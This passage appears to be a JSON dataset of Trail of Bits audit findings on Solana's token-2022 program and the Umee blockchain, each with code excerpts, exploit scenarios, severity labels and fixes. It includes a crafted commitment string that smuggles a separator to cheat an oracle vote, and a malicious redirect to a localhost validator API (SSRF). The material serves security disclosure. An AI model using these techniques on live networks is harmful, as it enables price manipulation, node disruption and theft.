i64, ) } #[cfg(not(feature = \"zk-ops\" ))] Err (ProgramError::InvalidInstructionData) } ConfidentialTransferInstruction::TransferWithFee => { msg!( \"ConfidentialTransferInstruction::TransferWithFee\" ); #[cfg(feature = \"zk-ops\" )] { let data = decode_instruction_data::<TransferInstructionData>(input)?; process_transfer( program_id, accounts, data.new_source_decryptable_available_balance, data.proof_instruction_offset as i64, ) } #[cfg(not(feature = \"zk-ops\" ))] { Err (ProgramError::InvalidInstructionData) } } Figure 10.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/processor.rs#L1192-L1223 Recommendations Short term, deprecate the TransferWithFee instruction, and update the documentation for the Transfer instruction to clarify the use of fees. This will ensure that contract users will not be misled in how the instructions are performed.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "11. Some instructions operate only on the lo bits of balances ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "For condential transfers, the pending balance is split into lo and hi values: of the total 64 bits representing the value, lo contains the low 16 bits, and hi contains the high 48 bits. Some instructions seem to update only the lo bits. For example, the process_destination_for_transfer function updates only the pending_balance_lo eld of the destination_confidential_transfer_account account. Changing the ct_withdraw_withheld_tokens_from_accounts integration test so that the resulting fee is greater than u16::Max (and updating the test to account for other changes to account balances) breaks the test, which indicates that the pattern of updating only the lo bits is problematic. We found the same pattern in the process_withdraw_withheld_tokens_from_mint function for the destination_confidential_transfer_account account and in the process_withdraw_withheld_tokens_from_accounts function for the destination_confidential_transfer_account account. #[cfg(feature = \"zk-ops\" )] fn process_destination_for_transfer ( destination_token_account_info: & AccountInfo , mint_info: & AccountInfo , destination_encryption_pubkey: & EncryptionPubkey , destination_ciphertext_lo: & EncryptedBalance , destination_ciphertext_hi: & EncryptedBalance , encrypted_fee: Option <EncryptedFee>, ) -> ProgramResult { check_program_account(destination_token_account_info.owner)?; ... // subtract fee from destination pending balance let new_destination_pending_balance = ops::subtract( &destination_confidential_transfer_account.pending_balance_lo, &ciphertext_fee_destination, ) .ok_or(ProgramError::InvalidInstructionData)?; // add encrypted fee to current withheld fee let new_withheld_amount = ops::add( &destination_confidential_transfer_account.withheld_amount, &ciphertext_fee_withheld_authority, ) .ok_or(ProgramError::InvalidInstructionData)?; destination_confidential_transfer_account.pending_balance_lo = new_destination_pending_balance; destination_confidential_transfer_account.withheld_amount = new_withheld_amount; ... Figure 11.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/confidential_transfer/processor.rs#L761-L777 Recommendations Short term, investigate the security implications of operating only on the lo bits in operations and determine whether this pattern should be changed.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "12. Instruction susceptible to front-running ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf", "body": "The code comments for the WithdrawWithheldTokensFromAccounts instruction state that the instruction is susceptible to front-running. The comments list two alternatives to the function HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint indicating that this vulnerable function could be deprecated. /// Transfer all withheld tokens to an account. Signed by the mint's withdraw withheld tokens /// authority. This instruction is susceptible to front-running. Use /// `HarvestWithheldTokensToMint` and `WithdrawWithheldTokensFromMint` as an alternative. /// /// Note on front-running: This instruction requires a zero-knowledge proof verification /// instruction that is checked with respect to the account state (the currently withheld /// fees). Suppose that a withdraw withheld authority generates the /// `WithdrawWithheldTokensFromAccounts` instruction along with a corresponding zero-knowledge /// proof for a specified set of accounts, and submits it on chain. If the withheld fees at any /// of the specified accounts change before the `WithdrawWithheldTokensFromAccounts` is /// executed on chain, the zero-knowledge proof will not verify with respect to the new state, /// forcing the transaction to fail. /// /// If front-running occurs, then users can look up the updated states of the accounts, /// generate a new zero-knowledge proof and try again. Alternatively, withdraw withheld /// authority can first move the withheld amount to the mint using /// `HarvestWithheldTokensToMint` and then move the withheld fees from mint to a specified /// destination account using `WithdrawWithheldTokensFromMint`. Figure 12.1: https://github.com/solana-labs/solana-program-library/blob/50abadd819df2 e406567d6eca31c213264c1c7cd/token/program-2022/src/extension/confidentia l_transfer/instruction.rs#L313-L330 Recommendations Short term, consider deprecating this instruction in favor of the alternatives suggested in the WithdrawWithheldTokensFromAccounts code comments, HarvestWithheldTokensToMint and WithdrawWithheldTokensFromMint . This will ensure that contract users who may have missed the comment describing the front-running vulnerability will not be exposed to the issue. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Integer overow in Peggo's deploy-erc20-raw command ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The denom-decimals argument of the deploy-erc20-raw command (in the deployERC20RawCmd function) may experience an integer overow. The argument is rst parsed into a value of the int type by the strconv.Atoi function and then cast to a value of the uint8 type (gure 1.1). If the denom-decimals argument with which deploy-erc20-raw is invoked is a negative value or a value that is too large, the casting operation will cause an overow; however, the user will not receive an error, and the execution will proceed with the overow value. func deployERC20RawCmd() *cobra.Command { return &cobra.Command{ Use: \"deploy-erc20-raw [gravity-addr] [denom-base] [denom-name] [denom-symbol] [denom-decimals]\" , /* (...) */ , RunE: func (cmd *cobra.Command, args [] string ) error { denomDecimals, err := strconv.Atoi(args[ 4 ]) if err != nil { return fmt.Errorf( \"invalid denom decimals: %w\" , err) } tx, err := gravityContract.DeployERC20(auth, denomBase, denomName, denomSymbol, uint8 (denomDecimals) ) Figure 1.1: peggo/cmd/peggo/bridge.go#L348-L353 We identied this issue by running CodeQL's IncorrectIntegerConversionQuery.ql query. Recommendations Short term, x the integer overow in Peggos deployERC20RawCmd function by using the strconv.ParseUint function to parse the denom-decimals argument. To do this, use the patch in gure 1.2. diff --git a/cmd/peggo/bridge.go b/cmd/peggo/bridge.go index 49aabc5..4b3bc6a 100644 --- a/cmd/peggo/bridge.go +++ b/cmd/peggo/bridge.go @@ -345,7 +345,7 @@ network starting.`, - + denomBase := args[ 1 ] denomName := args[ 2 ] denomSymbol := args[ 3 ] denomDecimals, err := strconv.Atoi(args[ 4 ]) denomDecimals, err := strconv.ParseUint(args[ 4 ], 10 , 8 ) if err != nil { return fmt.Errorf( \"invalid denom decimals: %w\" , err) } Figure 1.2: A patch for the integer overow issue in Peggo's deploy-erc20-raw command Long term, integrate CodeQL into the CI/CD pipeline to nd similar issues in the future.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Rounding of the standard deviation value may deprive voters of rewards ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The ExchangeRateBallot.StandardDeviation function calculates the standard deviation of the exchange rates submitted by voters. To do this, it converts the variance into a oat, prints its square root to a string, and parses it into a Dec value (gure 2.1). This logic rounds down the standard deviation value, which is likely unexpected behavior; if the exchange rate is within the reward spread value, voters may not receive the rewards they are owed. The rounding operation is performed by the fmt.Sprintf(\"%f\", floatNum) function, which, as shown in Appendix C , may cut o decimal places from the square root value. // StandardDeviation returns the standard deviation by the power of the ExchangeRateVote. func (pb ExchangeRateBallot) StandardDeviation() (sdk.Dec, error ) { // (...) variance := sum.QuoInt64( int64 ( len (pb))) floatNum, err := strconv.ParseFloat(variance.String(), 64 ) if err != nil { /* (...) */ } floatNum = math.Sqrt(floatNum) standardDeviation, err := sdk.NewDecFromStr(fmt.Sprintf( \"%f\" , floatNum)) if err != nil { /* (...) */ } return standardDeviation, nil } Figure 2.1: Inaccurate oat conversions ( umee/x/oracle/types/ballot.go#L89-L97 ) Exploit Scenario A voter reports a price that should be within the reward spread. However, because the standard deviation value is rounded, the price is not within the reward spread, and the voter does not receive a reward. Recommendations Short term, have the ExchangeRateBallot.StandardDeviation function use the Dec.ApproxSqrt method to calculate the standard deviation instead of parsing the variance into a oat, calculating the square root, and parsing the formatted oat back into a value of the Dec type. That way, users who vote for exchange rates close to the correct reward spread will receive the rewards they are owed. Figure 2.2 shows a patch for this issue. diff --git a/x/oracle/types/ballot.go b/x/oracle/types/ballot.go index 6b201c2..9f6b579 100644 --- a/x/oracle/types/ballot.go +++ b/x/oracle/types/ballot.go @@ -1,12 +1,8 @@ package types import ( - - - - - + ) \"fmt\" \"math\" \"sort\" \"strconv\" sdk \"github.com/cosmos/cosmos-sdk/types\" \"sort\" // VoteForTally is a convenience wrapper to reduce redundant lookup cost. @@ - 88 , 13 + 84 , 8 @@ func (pb ExchangeRateBallot) StandardDeviation() (sdk.Dec, error ) { - - - - + - - variance := sum.QuoInt64( int64 ( len (pb))) floatNum, err := strconv.ParseFloat(variance.String(), 64 ) if err != nil { return sdk.ZeroDec(), err } standardDeviation, err := variance.ApproxSqrt() floatNum = math.Sqrt(floatNum) standardDeviation, err := sdk.NewDecFromStr(fmt.Sprintf( \"%f\" , floatNum)) if err != nil { return sdk.ZeroDec(), err } diff --git a/x/oracle/types/ballot_test.go b/x/oracle/types/ballot_test.go index 0cd09d8..0dd1f1a 100644 --- a/x/oracle/types/ballot_test.go +++ b/x/oracle/types/ballot_test.go @@ - 177 , 21 + 177 , 21 @@ func TestPBStandardDeviation(t *testing.T) { - + - + }, { }, { [] float64 { 1.0 , 2.0 , 10.0 , 100000.0 }, [] int64 { 1 , 1 , 100 , 1 }, [] bool { true , true , true , true }, sdk.NewDecWithPrec( 4999500036300 , OracleDecPrecision), sdk.MustNewDecFromStr( \"49995.000362536252310906\" ), // Adding fake validator doesn't change outcome [] float64 { 1.0 , 2.0 , 10.0 , 100000.0 , 10000000000 }, [] int64 { 1 , 1 , 100 , 1 , 10000 }, [] bool { true , true , true , true , false }, sdk.NewDecWithPrec( 447213595075100600 , OracleDecPrecision), sdk.MustNewDecFromStr( \"4472135950.751005519905537611\" ), // Tie votes [] float64 { 1.0 , 2.0 , 3.0 , 4.0 }, [] int64 { 1 , 100 , 100 , 1 }, - + [] bool { true , true , true , true }, sdk.NewDecWithPrec( 122474500 , OracleDecPrecision), sdk.MustNewDecFromStr( \"1.224744871391589049\" ), }, { // No votes Figure 2.2: A patch for this issue", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Vulnerabilities in exchange rate commitment scheme ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The Umee oracle implements a commitment scheme in which users vote on new exchange rates by submitting \"pre-vote\" and \"vote\" messages. However, vulnerabilities in this scheme could allow an attacker to (1) predict the prices to which other voters have committed and (2) send two prices for an asset in a pre-vote message hash and then submit one of the prices in the vote message. (Note that predicting other prices would likely require the attacker to make some correct guesses about those prices.) The rst issue is that the random salt used in the scheme is too short. The salt is generated as two random bytes (gure 3.1) and is later hex-encoded and limited to four bytes (gure 3.2). As a result, an attacker could pre-compute the pre-vote commitment hash of every salt value (and thus the expected exchange rate), eectively violating the hiding property of the scheme. salt, err := GenerateSalt( 2 ) Figure 3.1: The salt-generation code ( umee/price-feeder/oracle/oracle.go#358 ) if len (msg.Salt) > 4 || len (msg.Salt) < 1 { return sdkerrors.Wrap(ErrInvalidSaltLength, \"salt length must be [1, 4]\" ) } Figure 3.2: The salt-validation logic ( umee/x/oracle/types/msgs.go#148150 ) The second issue is the lack of proper salt validation, which would guarantee sucient domain separation between a random salt and the exchange rate when the commitment hash is calculated. The domain separator string consists of a colon character, as shown in gure 3.3. However, there is no verication of whether the salt is a hex-encoded string or whether it contains the separator character; only the length of the salt is validated. This bug could allow an attacker to reveal an exchange rate other than the one the attacker had committed to, violating the binding property of the scheme. func GetAggregateVoteHash(salt string , exchangeRatesStr string , voter sdk.ValAddress) AggregateVoteHash { hash := tmhash.NewTruncated() sourceStr := fmt.Sprintf( \"%s:%s:%s\" , salt, exchangeRatesStr, voter.String() ) Figure 3.3: The generation of a commitment hash ( umee/x/oracle/types/hash.go#2325 ) The last vulnerability in the scheme is the insucient validation of exchange rate strings: the strings undergo unnecessary trimming, and the code checks only that len(denomAmountStr) is less than two (gure 3.4), rather than performing a stricter check to conrm that it is not equal to two. This could allow an attacker to exploit the second bug described in this nding. func ParseExchangeRateTuples(tuplesStr string ) (ExchangeRateTuples, error ) { tuplesStr = strings.TrimSpace(tuplesStr) if len (tuplesStr) == 0 { return nil , nil } tupleStrs := strings.Split(tuplesStr, \",\" ) // (...) for i, tupleStr := range tupleStrs { denomAmountStr := strings.Split(tupleStr, \":\" ) if len (denomAmountStr) < 2 { return nil , fmt.Errorf( \"invalid exchange rate %s\" , tupleStr) } } // (...) } Figure 3.4: The code that parses exchange rates ( umee/x/oracle/types/vote.go#7286 ) Exploit Scenario The maximum salt length of two is increased. During a subsequent pre-voting period, a malicious validator submits the following commitment hash: sha256(\"whatever:UMEE:123:UMEE:456,USDC:789:addr\") . (Note that  represents a normal whitespace character.) Then, during the voting period, the attacker waits for all other validators to reveal their exchange rates and salts and then chooses the UMEE price that he will reveal ( 123 or 456 ). In this way, the attacker can manipulate the exchange rate to his advantage. If the attacker chooses to reveal a price of 123 , the following will occur: 1. The salt will be set to whatever . 2. The attacker will submit an exchange rate string of UMEE:123:UMEE:456,USDC:789 . 3. The value will be hashed as sha256( whatever : UMEE:123:UMEE:456,USDC:789 : addr) . 4. The exchange rate will then be parsed as 123/789 (UMEE/USDC). Note that  UMEE = 456 (with its leading whitespace character) will be ignored. This is because of the insucient validation of exchange rate strings (as described above) and the fact that only the rst and second items of denomAmountStr are used. (See the screenshot in Appendix D). If the attacker chooses to reveal a price of 456 , the following will occur: 1. The salt will be set to whatever:UMEE:123 . 2. The exchange rate string will be set to UMEE:456,USDC:789 . 3. The value will be hashed as sha256( whatever:UMEE:123 : UMEE:456,USDC:789 : addr) . 4. Because exchange rate strings undergo space trimming, the exchange rate will be parsed as 456/789 (UMEE/USDC). Recommendations Short term, take the following steps:    Increase the salt length to prevent brute-force attacks. To ensure a security level of X bits, use salts of 2*X random bits. For example, for a 128-bit security level, use salts of 256 bits (32 bytes). Ensure domain separation by implementing validation of a salts format and accepting only hex-encoded strings. Implement stricter validation of exchange rates by ensuring that every exchange rate substring contains exactly one colon character and checking whether all denominations are included in the list of accepted denominations; also avoid trimming whitespaces at the beginning of the parsing process. Long term, consider replacing the truncated SHA-256 hash function with a SHA-512/256 or HMAC-SHA256 function. This will increase the level of security from 80 bits to about 128, which will help prevent collision and length extension attacks.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "4. Validators can crash other nodes by triggering an integer overow ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "By submitting a large exchange rate value, a validator can trigger an integer overow that will cause a Go panic and a node crash. The Umee oracle code checks that each exchange rate submitted by a validator is a positive value with a bit size of less than or equal to 256 (gures 4.1 and 4.2). The StandardDeviation method iterates over all exchange rates and adds up their squares (gure 4.3) but does not check for an overow. A large exchange rate value will cause the StandardDeviation method to panic when performing multiplication or addition . func ParseExchangeRateTuples(tuplesStr string ) (ExchangeRateTuples, error ) { // (...) for i, tupleStr := range tupleStrs { // (...) decCoin, err := sdk.NewDecFromStr(denomAmountStr[ 1 ]) // (...) if !decCoin.IsPositive() { return nil , types.ErrInvalidOraclePrice } Figure 4.1: The check of whether the exchange rate values are positive ( umee/x/oracle/types/vote.go#L71-L96 ) func (msg MsgAggregateExchangeRateVote) ValidateBasic() error { // (...) exchangeRates, err := ParseExchangeRateTuples(msg.ExchangeRates) if err != nil { /* (...) - returns wrapped error */ } for _, exchangeRate := range exchangeRates { // check overflow bit length if exchangeRate.ExchangeRate.BigInt().BitLen() > 255 +sdk.DecimalPrecisionBits // (...) - returns error Figure 4.2: The check of the exchange rate values bit lengths ( umee/x/oracle/types/msgs.go#L136-L146 ) sum := sdk.ZeroDec() for _, v := range pb { deviation := v.ExchangeRate.Sub(median) sum = sum.Add(deviation.Mul(deviation)) } Figure 4.3: Part of the StandardDeviation method ( umee/x/oracle/types/ballot.go#8387 ) The StandardDeviation method is called by the Tally function, which is called in the EndBlocker function. This means that an attacker could trigger an overow remotely in another validator node. Exploit Scenario A malicious validator commits to and then sends a large UMEE exchange rate value. As a result, all validator nodes crash, and the Umee blockchain network stops working. Recommendations Short term, implement overow checks for all arithmetic operations involving exchange rates. Long term, use fuzzing to ensure that no other parts of the code are vulnerable to overows.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "5. The repayValue variable is not used after being modied ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The Keeper.LiquidateBorrow function uses the local variable repayValue to calculate the repayment.Amount value. If repayValue is greater than or equal to maxRepayValue , it is changed to that value. However, the repayValue variable is not used again after being modied, which suggests that the modication could be a bug or a code quality issue. func (k Keeper) LiquidateBorrow( // (...) // repayment cannot exceed borrowed value * close factor maxRepayValue := borrowValue.Mul(closeFactor) repayValue, err := k.TokenValue(ctx, repayment) if err != nil { return sdk.ZeroInt(), sdk.ZeroInt(), err } if repayValue.GTE(maxRepayValue) { // repayment *= (maxRepayValue / repayValue) repayment.Amount = repayment.Amount.ToDec().Mul(maxRepayValue).Quo( repayValue ).TruncateInt() repayValue = maxRepayValue } // (...) Figure 5.1: umee/x/leverage/keeper/keeper.go#L446-L456 We identied this issue by running CodeQL's DeadStoreOfLocal.ql query. Recommendations Short term, review and x the repayValue variable in the Keeper.LiquidateBorrow function, which is not used after being modied, to prevent related issues in the future.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "6. Inconsistent error checks in GetSigners methods ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The GetSigners methods in the x/oracle and x/leverage modules exhibit dierent error-handling behavior when parsing strings into validator or account addresses. The GetSigners methods in the x/oracle module always panic upon an error, while the methods in the x/leverage module explicitly ignore parsing errors. Figures 6.1 and 6.2 show examples of the GetSigners methods in those modules. We set the severity of this nding to informational because message addresses parsed in the x/leverage modules GetSigners methods are also validated in the ValidateBasic methods. As a result, the issue is not currently exploitable. // GetSigners implements sdk.Msg func (msg MsgDelegateFeedConsent) GetSigners() []sdk.AccAddress { operator, err := sdk.ValAddressFromBech32(msg.Operator) if err != nil { panic (err) } return []sdk.AccAddress{sdk.AccAddress(operator)} } Figure 6.1: umee/x/oracle/types/msgs.go#L174-L182 func (msg *MsgLendAsset) GetSigners() []sdk.AccAddress { lender, _ := sdk.AccAddressFromBech32(msg.GetLender()) return []sdk.AccAddress{lender} } Figure 6.2: umee/x/leverage/types/tx.go#L30-L33 Recommendations Short term, use a consistent error-handling process in the x/oracle and x/leverage modules GetSigners methods. The x/leverage module's GetSigners functions should handle errors in the same way that the x/oracle methods doby panicking.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Incorrect price assumption in the GetExchangeRateBase function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "If the denominator string passed to the GetExchangeRateBase function contains the substring USD (gure 7.1), the function returns 1 , presumably to indicate that the denominator is a stablecoin. If the system accepts an ERC20 token that is not a stablecoin but has a name containing USD, the system will report an incorrect exchange rate for the asset, which may enable token theft. Moreover, the price of an actual USD stablecoin may vary from USD 1. Therefore, if a stablecoin used as collateral for a loan loses its peg, the loan may not be liquidated correctly. // GetExchangeRateBase gets the consensus exchange rate of an asset // in the base denom (e.g. ATOM -> uatom) func (k Keeper) GetExchangeRateBase(ctx sdk.Context, denom string ) (sdk.Dec, error ) { if strings.Contains(strings.ToUpper(denom), types.USDDenom) { return sdk.OneDec(), nil } // (...) Figure 7.1: umee/x/oracle/keeper/keeper.go#L89-L94 func (k Keeper) TokenPrice(ctx sdk.Context, denom string ) (sdk.Dec, error ) { if !k.IsAcceptedToken(ctx, denom) { return sdk.ZeroDec(), sdkerrors.Wrap(types.ErrInvalidAsset, denom) } price, err := k.oracleKeeper.GetExchangeRateBase(ctx, denom) // (...) return price, nil } Figure 7.2: umee/x/leverage/keeper/oracle.go#L12-L34 Exploit Scenario Umee adds the cUSDC ERC20 token as an accepted token. Upon its addition, its price is USD 0.02, not USD 1. However, because of the incorrect price assumption, the system sets its price to USD 1. This enables an attacker to create an undercollateralized loan and to draw funds from the system. Exploit Scenario 2 The price of a stablecoin drops signicantly. However, the x/leverage module fails to detect the change and reports the price as USD 1. This enables an attacker to create an undercollateralized loan and to draw funds from the system. Recommendations Short term, remove the condition that causes the GetExchangeRateBase function to return a price of USD 1 for any asset whose name contains USD.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "8. Oracle price-feeder is vulnerable to manipulation by a single malicious price feed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The price-feeder component uses a volume-weighted average price (VWAP) formula to compute average prices from various third-party providers. The price it determines is then sent to the x/oracle module, which commits it on-chain. However, an asset price could easily be manipulated by only one compromised or malfunctioning third-party provider. Exploit Scenario Most validators are using the Binance API as one of their price providers. The API is compromised by an attacker and suddenly starts to report prices that are much higher than those reported by other providers. However, the price-feeder instances being used by the validators do not detect the discrepancies in the Binance API prices. As a result, the VWAP value computed by the price-feeder and committed on-chain is much higher than it should be. Moreover, because most validators have committed the wrong price, the average computed on-chain is also wrong. The attacker then draws funds from the system. Recommendations Short term, implement a price-feeder mechanism for detecting the submission of wildly incorrect prices by a third-party provider. Have the system temporarily disable the use of the malfunctioning provider(s) and issue an alert calling for an investigation. If it is not possible to automatically identify the malfunctioning provider(s), stop committing prices. (Note, though, that this may result in a loss of interest for validators.) Consider implementing a similar mechanism in the x/oracle module so that it can identify when the exchange rates committed by validators are too similar to one another or to old values. References  Synthetix Response to Oracle Incident", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "9. Oracle rewards may not be distributed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "If the x/oracle module lacks the coins to cover a reward payout, the rewards will not be distributed or registered for payment in the future. var periodRewards sdk.DecCoins for _, denom := range rewardDenoms { rewardPool := k.GetRewardPool(ctx, denom) // return if there's no rewards to give out if rewardPool.IsZero() { continue } periodRewards = periodRewards.Add(sdk.NewDecCoinFromDec( denom, sdk.NewDecFromInt(rewardPool.Amount).Mul(distributionRatio), )) } Figure 9.1: A loop in the code that calculates oracle rewards ( umee/x/oracle/keeper/reward.go#4356 ) Recommendations Short term, document the fact that oracle rewards will not be distributed when the x/oracle module does not have enough coins to cover the rewards.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. Risk of server-side request forgery attacks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The price-feeder sends HTTP requests to congured providers APIs. If any of the HTTP responses is a redirect response (e.g., one with HTTP response code 301), the module will automatically issue a new request to the address provided in the responses header. The new address may point to a local address, potentially one that provides access to restricted services. Exploit Scenario An attacker gains control over the Osmosis API. He changes the endpoint used by the price-feeder such that it responds with a redirect like that shown in gure 10.1, with the goal of removing a transaction from a Tendermint validators mempool. The price-feeder automatically issues a new request to the Tendermint REST API. Because the API does not require authentication and is running on the same machine as the price-feeder , the request is successful, and the target transaction is removed from the validator's mempool. HTTP/1.1 301 Moved Permanently Location: http://localhost:26657/remove_tx?txKey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Figure 10.1: The redirect response Recommendations Short term, use a function such as CheckRedirect to disable redirects, or at least redirects to local services, in all HTTP clients.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "11. Incorrect comparison in SetCollateralSetting method ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Umee users can send a SetCollateral message to disable the use of a certain asset as collateral. The messages are handled by the SetCollateralSetting method (gure 11.1), which should ensure that the borrow limit will not drop below the amount borrowed. However, the function uses an incorrect comparison, checking that the borrow limit will be greater than, not less than, that amount. // Return error if borrow limit would drop below borrowed value if newBorrowLimit.GT(borrowedValue) { return sdkerrors.Wrap(types.ErrBorrowLimitLow, newBorrowLimit.String()) } Figure 11.1: The incorrect comparison in the SetCollateralSetting method ( umee/x/leverage/keeper/keeper.go#343346 ) Exploit Scenario An attacker provides collateral to the Umee system and borrows some coins. Then the attacker disables the use of the collateral asset; because of the incorrect comparison in the SetCollateralSetting method, the disable operation succeeds, and the collateral is sent back to the attacker. Recommendations Short term, correct the comparison in the SetCollateralSetting method. Long term, implement tests to check whether basic functionality works as expected.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "12. Voters ability to overwrite their own pre-votes is not documented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The x/oracle module allows voters to submit more than one pre-vote message during the same pre-voting period, overwriting their previous pre-vote messages (gure 12.1). This feature is not documented; while it does not constitute a direct security risk, it may be unintended behavior. Third parties may incorrectly assume that validators cannot change their pre-vote messages. Monitoring systems may detect only the rst pre-vote event for a validators pre-vote messages, while voters may trust the exchange rates and salts revealed by other voters to be nal. On the other hand, this feature may be an intentional one meant to allow voters to update the exchange rates they submit as they obtain more accurate pricing information. func (ms msgServer) AggregateExchangeRatePrevote( goCtx context.Context, msg *types.MsgAggregateExchangeRatePrevote, ) (*types.MsgAggregateExchangeRatePrevoteResponse, error ) { // (...) aggregatePrevote := types.NewAggregateExchangeRatePrevote(voteHash, valAddr, uint64 (ctx.BlockHeight())) // This call overwrites previous pre-vote if there was one ms.SetAggregateExchangeRatePrevote(ctx, valAddr, aggregatePrevote) ctx.EventManager().EmitEvents(sdk.Events{ // (...) - emit EventTypeAggregatePrevote and EventTypeMessage }) return &types.MsgAggregateExchangeRatePrevoteResponse{}, nil } Figure 12.1: umee/x/oracle/keeper/msg_server.go#L23-L66 Recommendations Short term, document the fact that a pre-vote message can be submitted and overwritten in the same voting period. Alternatively, disallow this behavior by having the AggregateExchangeRatePrevote function return an error if a validator attempts to submit an additional exchange rate pre-vote message. Long term, add tests to check for this behavior.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "13. Lack of user-controlled limits for input amount in LiquidateBorrow ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The x/leverage modules LiquidateBorrow function computes the amount of funds that will be transferred from the module to the functions caller in a liquidation. The computation uses asset prices retrieved from an oracle. There is no guarantee that the amount returned by the module will correspond to the current market price, as a transaction that updates the price feed could be mined before the call to LiquidateBorrow . Adding a lower limit to the amount sent by the module would enable the caller to explicitly state his or her assumptions about the liquidation and to ensure that the collateral payout is as protable as expected. It would also provide additional protection against the misreporting of oracle prices. Since such a scenario is unlikely, we set the diculty level of this nding to high. Using caller-controlled limits for the amount of a transfer is a best practice commonly employed by large DeFi protocols such as Uniswap. Exploit Scenario Alice calls the LiquidateBorrow function. Due to an oracle malfunction, the amount of collateral transferred from the module is much lower than the amount she would receive on another market. Recommendations Short term, introduce a minRewardAmount parameter and add a check verifying that the reward value is greater than or equal to the minRewardAmount value. Long term, always allow the caller to control the amount of a transfer. This is especially important for transfer amounts that depend on factors that can change between transactions. Enable the caller to add a lower limit for a transfer from a module and an upper limit for a transfer of the callers funds to a module.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "14. Lack of simulation and fuzzing of leverage module invariants ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The Umee system lacks comprehensive Cosmos SDK simulations and invariants for its x/oracle and x/leverage modules. More thorough use of the simulation feature would facilitate fuzz testing of the entire blockchain and help ensure that the invariants hold. Additionally, the current simulation module may need to be modied for the following reasons:     It exits on the rst transaction error . To avoid an early exit, it could skip transactions that are expected to fail when they are generated; however, that could also cause it to skip logic that contains issues. The numKeys argument , which determines how many accounts it will use, can range from 2 to 2,500. Using too many accounts may hinder the detection of bugs that require multiple transactions to be executed by a few accounts. By default, it is congured to use a \"stake\" currency , which may not be used in the nal Umee system. Running it with a small number of accounts and a large block size for many blocks could quickly cause all validators to be unbonded. To avoid this issue, the simulation would need the ability to run for a longer time. attempted to use the simulation module by modifying the recent changes to the Umee codebase, which introduce simulations for the x/oracle and x/leverage modules (commit f22b2c7f8e ). We enabled the x/leverage module simulation and modied the Cosmos SDK codebase locally so that the framework would use fewer accounts and log errors via Fatalf logs instead of exiting. The framework helped us nd the issue described in TOB-UMEE-15 , but the setup and tests we implemented were not exhaustive. We sent the codebase changes we made to the Umee team via an internal chat. Recommendations Short term, identify, document, and test all invariants that are important for the systems security, and identify and document the arbitrage opportunities created by the system. Enable simulation of the x/oracle and x/leverage modules and ensure that the following assertions and invariants are checked during simulation runs: 1. In the UpdateExchangeRates function , the token supply value corresponds to the uToken supply value. Implement the following check: if uTokenSupply != 0 { assert(tokenSupply != 0) } 2. In the LiquidateBorrow function (after the line  if !repayment.Amount.IsPositive()  ) , the following comparisons evaluate to true: ExchangeUToken(reward) == EquivalentTokenValue(repayment, baseRewardDenom) TokenValue(ExchangeUToken(ctx, reward)) == TokenValue(repayment) borrowed.AmountOf(repayment.Denom) >= repayment.Amount collateral.AmountOf(rewardDenom) >= reward.Amount module's collateral amount >= reward.Amount repayment <= desiredRepayment 3. The x/leverage module is never signicantly undercollateralized at the end of a transaction. Implement a check, total collateral value * X >= total borrows value , in which X is close to 1. (It may make sense for the value of X to be greater than or equal to 1 to account for module reserves.) It may be acceptable for the module to be slightly undercollateralized, as it may mean that some liquidations have yet to be executed. 4. The amount of reserves remains above a certain minimum value, or new loans cannot be issued if the amount of reserves drops below a certain value. 5. The interest on a loan is less than or equal to the borrowing fee. (This invariant is related to the issue described in TOB-UMEE-23 .) 6. 7. 8. It is impossible to borrow funds without paying a fee. Currently, when four messages (lend, borrow, repay, and withdraw messages) are sent in one transaction, the EndBlocker method 